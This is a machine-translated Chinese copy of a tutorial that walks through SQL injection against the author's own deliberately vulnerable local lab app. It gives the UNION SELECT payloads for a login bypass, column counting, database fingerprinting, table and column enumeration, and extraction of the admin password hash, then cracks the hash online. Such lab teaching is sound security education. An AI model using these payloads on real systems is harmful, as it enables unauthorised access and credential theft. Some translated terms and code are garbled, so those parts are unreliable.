<html>
<head>
<title>Learn SQL injection in practice by hacking vulnerable application! — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过入侵易受攻击的应用程序在实践中学习SQL注入！—堆栈零</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec?source=collection_archive---------1-----------------------#2022-07-31">https://infosecwriteups.com/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec?source=collection_archive---------1-----------------------#2022-07-31</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/0a97a14202da6c4b95911acc438b4d37.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*RgsnXt5kwIf9GH-2.jpg"/></div></div></figure><h1 id="1827" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">介绍</h1><p id="5667" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在我看来，在实践中尝试一些SQL注入攻击是理解这一点的最佳方式。刚刚在网上搜索，我发现建立一个实验室可能会非常漫长和棘手，尤其是对初学者来说，而且往往会导致学生放弃。<br/>为了简化这个过程，我用python编写了一个可怕的web应用程序，名为<a class="ae lx" href="https://github.com/StackZeroSec/sdwa" rel="noopener ugc nofollow" target="_blank"> SDWA </a>(易受攻击的应用程序)。<br/>这只是处于胚胎阶段，但我们可以用它来学习:</p><ul class=""><li id="5775" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated">XSS</li><li id="c0ad" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">SQL注入</li><li id="4674" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">命令注入</li></ul><p id="4040" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我已经在本文的<a class="ae lx" href="https://medium.com/@stackzero/the-terrifying-world-of-cross-site-scripting-xss-part-2-stackzero-cc7fa7e8dcbb" rel="noopener">中谈到了XSS的部分，所以是时候关注SQL注入并将我们的知识付诸实践了。如果你不知道它是什么，我建议你慢慢来，看看这篇介绍。</a></p><p id="6388" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">这里列出了所有关于SQL注入的文章，以便快速浏览:</p><h1 id="cef5" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">带内SQL注入</h1><ul class=""><li id="4d35" class="ly lz it lb b lc ld lg lh lk mr lo ms ls mt lw mf mg mh mi bi translated"><a class="ae lx" href="https://medium.com/codex/sql-injection-what-you-need-to-know-stackzero-abc80bc1ea5e" rel="noopener"> SQL注入:您需要了解的内容</a></li><li id="be26" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><a class="ae lx" href="https://medium.com/bugbountywriteup/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec" rel="noopener">通过黑客攻击易受攻击的应用程序，在实践中学习SQL注入！</a></li><li id="b7e4" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><a class="ae lx" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">如何用SQL注入攻击进行黑客攻击！DVWA低安全性</a></li><li id="1294" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9">黑客用SQL注入攻击！DVWA中等安全性</a></li><li id="fd41" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-high-security-stackzero-713638840515">黑客用SQL注入攻击！DVWA高安全性</a></li></ul><h1 id="e517" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">盲人SQL注入</h1><ul class=""><li id="9ac5" class="ly lz it lb b lc ld lg lh lk mr lo ms ls mt lw mf mg mh mi bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)</a></li><li id="9f65" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)</a></li><li id="5af6" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第3部分)</a></li></ul><h1 id="cfbd" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">装置</h1><p id="0fd4" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">正如我在介绍中所说的，我试图使安装过程尽可能地简单，无论如何，它需要一些简单的步骤:</p><ul class=""><li id="4320" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated">有一个可用的虚拟机(这是可选的，但强烈建议)，我建议Kali Linux，如果你没有，尝试按照<a class="ae lx" href="https://www.stackzero.net/how-to-install-kali-linux-on-virtualbox-in-a-few-minutes/" rel="noopener ugc nofollow" target="_blank">这个教程</a>。另一个选择是从<a class="ae lx" href="https://www.kali.org/get-kali/#kali-virtual-machines" rel="noopener ugc nofollow" target="_blank">这里</a>下载预建的Virtualbox映像。</li><li id="5ad2" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">从GitHub的<a class="ae lx" href="https://github.com/StackZeroSec/sdwa" rel="noopener ugc nofollow" target="_blank">链接</a>中克隆存储库，方法是从终端向您选择的目录中键入以下命令:<br/> <code class="fe mu mv mw mx b">git clone <a class="ae lx" href="https://github.com/StackZeroSec/sdwa" rel="noopener ugc nofollow" target="_blank">https://github.com/StackZeroSec/sdwa</a></code></li><li id="e27d" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">用这个命令安装所有的依赖项:<br/> <code class="fe mu mv mw mx b">pip install -r requirements.txt</code></li><li id="0918" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">创建数据库:<br/> <code class="fe mu mv mw mx b">python db/setup_db.py</code></li><li id="c760" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">在终端上键入以下命令运行应用程序:<br/> <code class="fe mu mv mw mx b">flask run</code></li></ul><p id="6e55" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">此时，打开您的浏览器(如果您遵循了本教程，请使用Firefox)并在搜索url栏中键入该地址:<br/><em class="my">http://localhost:5000</em>或<em class="my"> http://127.0.0.1:5000 </em></p><p id="e046" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">如果您做的一切都正确，您应该会看到这个最小的屏幕:</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/9277321452543ed4f5d3a3ea84597438.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gwptq2Q8VHX_yINFFb7omA.jpeg"/></div></div></figure><p id="6bcb" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">这意味着应用程序正在工作，我们已经准备好在实践中了解一个真正的SQL注入是如何工作的。<br/>所以让我们进入主题的核心吧！</p><h1 id="7a4e" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">登录</h1><p id="71a8" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">整个应用程序非常简单，唯一的目的是让人们更好地理解SQLi是如何工作的。但是第一阶段非常简单:只不过是一个小小的热身。</p><p id="1bd5" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">在主页上点击“试用”后，链接会将我们带到一个登录页面。</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/1fb795a493bdb97eae9c8ec7ba5b1a50.png" data-original-src="https://miro.medium.com/v2/resize:fit:680/format:webp/1*mmAJKer-ZF6YcHZsvo3BRw.jpeg"/></div></figure><p id="13a0" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">很容易猜测，在没有任何关于用户名和密码的提示的情况下，目标是利用漏洞进入内部。</p><p id="f307" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我们要做的第一件事是在两个字段中的一个插入单引号，结果是一个内部错误。这可能暗示存在SQLi漏洞。</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/b44d7fc2e94313a2c5c9269821b3a39e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZylJtHSF73sDxuiiw-V6PQ.jpeg"/></div></div></figure><p id="c8bd" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">此时，我们可以尝试我们在<a class="ae lx" href="https://www.stackzero.net/what-is-sql-injection/" rel="noopener ugc nofollow" target="_blank">上一篇关于SQL注入的文章</a>中学到的东西，并付诸实践。</p><p id="c7f6" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">因此，我们可以想象服务器正在运行类似于下面的查询:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="b69a" class="nj kc it mx b gy nk nl l nm nn">SELECT * <br/>FROM USERTABLE <br/>WHERE username='your_user_input' AND password='your_password_input'</span></pre><p id="a935" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">显然，我们对数据库一无所知，但我们可以想象，如果查询给出一个结果，我们就在，所以让我们试着让它总是真的。<br/>我们的想法是操纵我们的输入，以便得到这样的结果:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="acfd" class="nj kc it mx b gy nk nl l nm nn">SELECT * <br/>FROM USERTABLE <br/>WHERE username='random_input' OR 1=1 -- 'AND password='random_password'</span></pre><p id="9107" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">在这种情况下，双破折号表示后面是一个注释，无论如何，语法取决于DBMS，在出现错误的情况下，我们应该尝试猜测我们的目标是什么。</p><p id="4b47" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">因此，让我们尝试通过键入以下内容登录(密码只是一个随机字符):</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div class="gh gi no"><img src="../Images/e9ddd5b231580c49611b062c429a5c42.png" data-original-src="https://miro.medium.com/v2/resize:fit:682/format:webp/1*Yzv_UIR4dEeJhVO8bT3q3A.jpeg"/></div></figure><p id="3d10" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">而且很管用！结果是下面的页面:</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/15d5a7d1ec417bc9ac3cc655f7deba0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z3MloP2BsDFwol1-ohObYw.jpeg"/></div></div></figure><p id="53d7" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">正如警报所说，我们是作为普通用户进入的，但我们在下一段要做的是利用一个新的漏洞并作为管理员进入！</p><h1 id="d68e" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">实践中的SQL注入:如何使用联合条款</h1><p id="fb22" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在这个阶段，我们可以读取一个输出，因此收集关于数据库的信息似乎很容易。在这一点上，我们的目标显然是以管理员身份访问。</p><p id="d844" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">只需看一眼，我们就能猜到用户名和密码在product表之外的表中。所以我们需要知道的是:</p><ul class=""><li id="4bc0" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated">products表的列数(可以在相同数量的列之间进行联合)</li><li id="eef4" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">数据库管理系统(MySql，SQLite，PostgreSQL，Oracle，微软…)</li><li id="3be5" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">包含用户名和口令的表的名称</li><li id="17c3" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated">用户表字段的名称</li></ul><h1 id="73da" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">涉及多少列？</h1><p id="b850" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">为了完成第一个任务，我们主要有两种技术:</p><ul class=""><li id="49ee" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated"><strong class="lb iu"> ORDER BY </strong>:我们可以尝试一系列的ORDER BY，直到出现错误，这是该指标超出范围的信号:</li></ul><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="be73" class="nj kc it mx b gy nk nl l nm nn">' ORDER BY 1-- <br/>' ORDER BY 2-- <br/>' ORDER BY 3-- ...</span></pre><ul class=""><li id="b1d6" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated"><strong class="lb iu">联合选择</strong>:另一种技术包括发送一个带有越来越多的空值的联合选择(甚至像数字1这样的常量值也可以)。这样，只有当“NULL”值的数量等于表的列数时，我们才不会得到错误</li></ul><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="a6c8" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT NULL-- <br/>' UNION SELECT NULL,NULL-- <br/>' UNION SELECT NULL,NULL,NULL-- ...</span></pre><p id="8401" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">仅仅通过尝试“ORDER BY”方法，即使索引为1，我们也会得到一个错误，所以这可能不是正确的方法。<br/>既然“联合选择”技术似乎更有前途，那我们就试试那个吧</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/926267275bb752d15d1be2ca4125ff27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*paNXD_VT8IFMoh3es3o2Yw.jpeg"/></div></div></figure><p id="ba56" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">这项技术没有辜负我们的期望，列数是4，我们可以继续下一步。</p><h1 id="31b6" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">目标DBMS是什么？</h1><p id="0679" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们的生活变得更容易的是知道我们的目标是什么数据库。<br/>有许多方法可以做到这一点，在这种情况下，我们利用不同的查询语法来返回版本。</p><p id="cbaf" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">以下是不同语法的列表:</p><ul class=""><li id="e20c" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated"><strong class="lb iu">神谕</strong> : <code class="fe mu mv mw mx b">SELECT version FROM v$instance</code></li><li id="dc14" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><strong class="lb iu">微软</strong> : <code class="fe mu mv mw mx b">SELECT @@version</code></li><li id="e377" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><strong class="lb iu"> PostgreSQL </strong> : <code class="fe mu mv mw mx b">SELECT version()</code></li><li id="6c91" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><strong class="lb iu"> MySQL </strong></li><li id="84bb" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><strong class="lb iu"> SQLite </strong> : <code class="fe mu mv mw mx b">SELECT sqlite_version()</code></li></ul><p id="96cf" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">知道包含产品的表有四列，我们可以设计查询来猜测什么是DBMS。</p><p id="de3e" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">输入应该是这样的:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="894d" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT 1, 1, 1, version_request --</span></pre><p id="745c" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">唯一没有返回错误的查询是SQLite查询，所以我们有了另一个有价值的信息。</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="cb69" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT 1, 1, 1, sqlite_version() --</span></pre><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/b6e280755529c7e808ce2183e7f3e65f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1nxhQT1SXv99EcEPBE5XRQ.jpeg"/></div></div></figure><h1 id="0429" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">获取表的名称</h1><p id="00b5" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在我们的SQL注入之旅的这一点上，我们需要知道表的名称，但是在开发应用程序之前，我将向您展示如何在SQLite中使用查询来做到这一点。</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="4387" class="nj kc it mx b gy nk nl l nm nn">SELECT name <br/>FROM sqlite_schema <br/>WHERE type ='table' AND name NOT LIKE 'sqlite_%'</span></pre><p id="1623" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">因此，在下一步中，我们希望将结果显示到我们的表中。<br/>我们可以通过UNION SELECT做到这一点，这一点我们已经很清楚了。这将是我们的输入:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="8677" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT 1, 1, 1,name FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%'--</span></pre><p id="0f01" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">上面的查询将让应用程序提示属于该应用程序的所有表，这将是结果。</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/57fcfb84c1cc2dae5ae05236a366446f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cKzo2JYxrEemixDtGCbJgA.jpeg"/></div></div></figure><p id="51ac" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我们感兴趣的表是名为“users”的表，我们的调查还需要一个步骤，我们可以进一步进入我们的过程以获得管理员凭证。</p><h1 id="5cc1" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">获取列的字段</h1><p id="0167" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这是我们在将它传递给真正的攻击之前需要的最后一个信息，让我们快速刷新一下获取SQLite3中的列名的方法:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="3420" class="nj kc it mx b gy nk nl l nm nn">SELECT name FROM pragma_table_info('table_name');</span></pre><p id="6fc0" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">现在，您应该很容易理解如何构造我们的输入，它将是:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="197b" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT 1, 1, 1, name FROM pragma_table_info('users') --</span></pre><p id="bd77" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">就这些，现在点击“搜索”按钮，结果如下:</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/7c3860ac2fcab0213d7b379a075b6051.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rd_W-hf6E5SbkECQK2S3Aw.jpeg"/></div></div></figure><h1 id="f7f7" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">SQL注入获取用户名和密码</h1><p id="8a1a" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在这个阶段，我们希望获得管理员的用户名和密码。<br/>可以想象，这项工作与我们迄今为止所做的并没有太大的不同。<br/>让我们试试我们的UNION SELECT查询，它甚至会显示字段“admin”代表什么。</p><p id="7720" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">为了利用漏洞，我们需要插入以下输入:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="c26b" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT 1, username, password,admin FROM users --</span></pre><p id="1d6a" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">输出将是:</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/bd2c657e05b368d60bdea6dd1130195b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-lCMVN1516SmF6_MKrIXuQ.jpeg"/></div></div></figure><p id="bdf4" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">密码看起来像md5输出，但它太短了，甚至“<em class="my"> flask_admi </em>”用户名似乎在10个字符后被截断。所以很可能有一个功能不允许你看到完整的密码。</p><p id="5c67" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">在职业生涯中你会发现很多类似的问题，所以要尽量有创意。在这种情况下，我选择使用sqlite3的函数<code class="fe mu mv mw mx b">substr( string, start, length)</code>，拆分flask_admin的密码(我猜应用程序已经截断了最后一个字符)。</p><p id="4272" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我将尝试运行一些查询，我事先不知道正确的顺序，因此与其浪费时间去推断，我将尝试运行四个单独的查询并记录结果:</p><pre class="na nb nc nd gt nf mx ng nh aw ni bi"><span id="b29f" class="nj kc it mx b gy nk nl l nm nn">' UNION SELECT 1, username, substr(password, 0, 10), admin FROM users -- <br/>' UNION SELECT 1, username, substr(password, 10, 10), admin FROM users -- <br/>' UNION SELECT 1, username, substr(password, 20, 10), admin FROM users -- <br/>' UNION SELECT 1, username, substr(password, 30, 3), admin FROM users --</span></pre><p id="5e12" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">下面是结果之一:</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/872ca2974baa387410b96bfc291cbf4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jHqdupQAR_pLpuk_PgwD7A.jpeg"/></div></div></figure><p id="9148" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">通过运行四个查询并连接结果，我们得到:</p><p id="37b7" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated"><strong class="lb iu">2138 cb5b 0302 e 84382 dd9b 3677576 b24</strong></p><p id="f920" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我们有散列密码，但我们需要进入最后一步，破解管理员的密码。</p><h1 id="15b6" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">破解密码</h1><p id="3404" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">Hash不是一个可逆函数，无论如何，你可以在网上找到很多预先计算的查找表，它们可以在几秒钟内破解一个弱密码。</p><p id="3d88" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我最喜欢的一个是<a class="ae lx" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank"> CrackStation </a>，所以点击链接，把你找到的哈希密码放入文本输入，求解capcha，破解哈希！</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/dde44798bb1e8f8560f7afa3dc0d835a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iiNDKkLhoPlg89ONHAJ-2w.jpeg"/></div></div></figure><p id="be19" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">密码已找到，因此此时您只需注销并尝试使用这些凭据以管理员身份登录:</p><ul class=""><li id="26aa" class="ly lz it lb b lc ma lg mb lk mc lo md ls me lw mf mg mh mi bi translated"><strong class="lb iu">用户名</strong> : flask_admin</li><li id="62fc" class="ly lz it lb b lc mj lg mk lk ml lo mm ls mn lw mf mg mh mi bi translated"><strong class="lb iu">密码:</strong>密码@123</li></ul><p id="1243" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">瞧，你已经以管理员身份登录了！</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/44e64a07946f983fd5ecedd693cc411c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gOK72LDfvQiejPcoPly0jg.jpeg"/></div></div></figure><h1 id="9ad4" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">结论</h1><p id="7d28" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">我希望你玩得开心，并通过开发这个应用程序学到了一些东西。如果你喜欢我的作品，请在Medium上关注我，并访问我的博客。</p><p id="1531" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated">我想制作更多这样的内容，如果你欣赏我的工作，请支持我，关注我所有的社交活动！</p></div><div class="ab cl np nq hx nr" role="separator"><span class="ns bw 